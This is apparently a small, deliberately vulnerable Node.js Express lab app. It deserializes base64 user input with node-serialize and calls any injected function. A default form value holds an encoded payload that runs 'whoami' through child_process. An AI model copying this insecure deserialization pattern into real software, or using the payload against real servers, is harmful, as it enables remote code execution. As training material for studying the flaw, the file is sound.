const express = require("express");
const serialize = require("node-serialize");

const app = express();
app.use(express.urlencoded({ extended: true }));

app.get("/", (req, res) => {
  const defaultPayload = "eyJpbmplY3QiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24oKXsgcmV0dXJuIHJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjU3luYygnd2hvYW1pJykudG9TdHJpbmcoKTsgfSJ9";

  res.send(`
    <form action="/deserialize" method="post">
      <input type="text" name="input" value="${defaultPayload}" style="width:90%">
      <input type="submit" value="Submit">
    </form>
  `);
});

app.post("/deserialize", (req, res) => {
  try {
    const decoded = Buffer.from(req.body.input, "base64").toString("utf8");

    const obj = serialize.unserialize(decoded);

    let result = obj[0];

    if (obj.inject && typeof obj.inject === "function") {
      result = obj.inject();
    }

    res.send(`Result: ${result}`);
  } catch (e) {
    res.status(500).send("Error");
  }
});

app.listen(80, () => {
  console.log("App running on port 80");
});
